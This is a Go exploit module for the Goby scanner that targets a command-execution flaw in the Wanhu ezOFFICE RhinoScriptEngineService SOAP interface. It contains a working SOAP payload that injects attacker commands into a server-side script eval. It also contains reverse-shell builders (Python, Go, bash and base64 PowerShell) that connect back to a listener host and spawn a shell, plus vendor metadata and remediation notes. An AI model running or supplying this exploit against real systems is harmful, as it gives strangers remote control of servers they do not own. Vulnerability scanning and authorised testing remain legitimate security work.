package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Wanhu OA /RhinoScriptEngineService Command Execution Vulnerability",
    "Description": "<p>Wanhu ezOFFICE collaborative management platform covers portal customization platform, information knowledge platform management, and system management platform functions. It uses workflow engine as underlying service, communication platform as communication means, and portal customization platform as information push display platform to provide users with an integrated collaborative working environment. </p><p>Wanhu ezOFFICE collaborative management platform RhinoScriptEngineService interface has a command execution vulnerability. Attackers can construct payloads to achieve remote command execution, write backdoors, and even control servers.</p>",
    "Product": "Whir-ezOFFICE",
    "Homepage": "http://www.whir.net/",
    "DisclosureDate": "2024-07-10",
    "PostTime": "2024-07-11",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": "title=\"ezOFFICE协同管理平台\" || title=\"Wanhu ezOFFICE\" || title=\"ezOffice for iPhone\" || body=\"EZOFFICEUSERNAME\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\" || banner=\"LocLan\" || header=\"OASESSIONID=\" || banner=\"OASESSIONID=\" || banner=\"/defaultroot/sp/login.jsp\" || header=\"/defaultroot/sp/login.jsp\" || body=\"whir.util.js\" || body=\"var ezofficeUserPortal_\"",
    "GobyQuery": "title=\"ezOFFICE协同管理平台\" || title=\"Wanhu ezOFFICE\" || title=\"ezOffice for iPhone\" || body=\"EZOFFICEUSERNAME\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\" || banner=\"LocLan\" || header=\"OASESSIONID=\" || banner=\"OASESSIONID=\" || banner=\"/defaultroot/sp/login.jsp\" || header=\"/defaultroot/sp/login.jsp\" || body=\"whir.util.js\" || body=\"var ezofficeUserPortal_\"",
    "Level": "3",
    "Impact": "<p>Wanhu ezOFFICE collaborative management platform RhinoScriptEngineService interface has a command execution vulnerability. Attackers can construct payloads to achieve remote command execution, write backdoors, and even control servers.</p>",
    "Recommendation": "<p>1. Please contact the manufacturer to obtain the latest security version. </p><p>2. Perform permission check on RhinoScriptEngineService.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByPowershellBase64,ByPowershell",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.3",
    "Translation": {
        "CN": {
            "Name": "万户OA /RhinoScriptEngineService 命令执行漏洞",
            "Product": "万户网络-ezOFFICE",
            "Description": "<p>万户ezOFFICE协同管理平台涵盖门户自定义平台、信息知识平台管理、系统管理平台功能，它以工作流引擎为底层服务，以通讯沟通平台为交流手段，以门户自定义平台为信息推送显示平台，为用户提供集成的协同工作环境。<br></p><p>万户ezOFFICE协同管理平台 RhinoScriptEngineService 接口存在命令执行漏洞，攻击者可以通过构造payload实现远程命令执行、写入后门甚至控制服务器。<br></p>",
            "Recommendation": "<p>1、请联系厂商获取最新安全版本。</p><p>2、对RhinoScriptEngineService 进行权限校验。</p>",
            "Impact": "<p>万户ezOFFICE协同管理平台 RhinoScriptEngineService 接口存在命令执行漏洞，攻击者可以通过构造payload实现远程命令执行、写入后门甚至控制服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Wanhu OA /RhinoScriptEngineService Command Execution Vulnerability",
            "Product": "Whir-ezOFFICE",
            "Description": "<p>Wanhu ezOFFICE collaborative management platform covers portal customization platform, information knowledge platform management, and system management platform functions. It uses workflow engine as underlying service, communication platform as communication means, and portal customization platform as information push display platform to provide users with an integrated collaborative working environment.&nbsp;</p><p>Wanhu ezOFFICE collaborative management platform RhinoScriptEngineService interface has a command execution vulnerability. Attackers can construct payloads to achieve remote command execution, write backdoors, and even control servers.</p>",
            "Recommendation": "<p>1. Please contact the manufacturer to obtain the latest security version.&nbsp;</p><p>2. Perform permission check on RhinoScriptEngineService.</p>",
            "Impact": "<p>Wanhu ezOFFICE collaborative management platform RhinoScriptEngineService interface has a command execution vulnerability. Attackers can construct payloads to achieve remote command execution, write backdoors, and even control servers.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10969"
}`

	setPayloadRequestHash_DBrUwj57CObjw7WV := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用

		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			PostRequest.Data = data
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}
		makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
			re := regexp.MustCompile(RegularUrl)
			// 查找匹配的内容
			matches := re.FindStringSubmatch(RegularContent)
			if len(matches) > 1 {
				return matches[1], nil
			} else {
				return "", fmt.Errorf("can't match value")
			}
		}
		//漏洞url地址
		url := "//defaultroot/services/./././RhinoScriptEngineService"
		header := map[string]string{
			"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0 ldwk",
			"Content-Type": "text/xml;charset=UTF-8",
			"SOAPAction":   "'\"\"'",
		}

		data := "<?xml version='1.0' encoding='UTF-8'?>\n         <soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:jav=\"http://javascript.script.sun.com\">\n           <soapenv:Body>\n             <eval xmlns=\"http://127.0.0.1:8080/services/scriptEngine\">\n               <arg0 xmlns=\"\">\n                 <![CDATA[\n                 try {\n                 load(\"nashorn:Moziilla_compat.js\");\n                 } catch (e) {\n                 }\n                 importPackage(Packages.java.io);\n                 importPackage(Packages.java.lang);\n                 importPackage(Packages.java.util);\n                 importPackage(Packages.java.net);\n\n                 new URLClassLoader([new File('../server').toURL()]).loadClass('Test12').getConstructor([Class.forName(\"java.lang.String\")]).newInstance([\"" + command + "\"]).toString()\n\n                 ]]>\n               </arg0>\n               <arg1 xmlns=\"\" xsi:type=\"urn:SimpleScriptContext\" xmlns:urn=\"urn:beanservice\">\n               </arg1>\n             </eval>\n           </soapenv:Body>\n         </soapenv:Envelope>"

		resp, err := setPostRequest(hostInfo, url, data, header)
		if err != nil || resp.StatusCode != 200 {
			return "", "", err
		}
		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult, _ := makeRegular(resp.RawBody, `<evalReturn[^>]*>([\s\S]*?)<\/evalReturn>`)

		return commandResult, url, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash_DBrUwj57CObjw7WV

			//开头为数字，他就只会返回第一段数字部分
			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash_DBrUwj57CObjw7WV

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				ReverseTcpByPython := func(rp string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" + godclient.GetGodServerHost() + "," + rp + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
				}
				ReverseTcpByGo := func(rp string) string {
					return "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" + godclient.GetGodServerHost() + ":" + rp + "\");cmd:=exec.Command(\"/bin/bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"ByPython":           ReverseTcpByPython,
					"ByGo":               ReverseTcpByGo,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
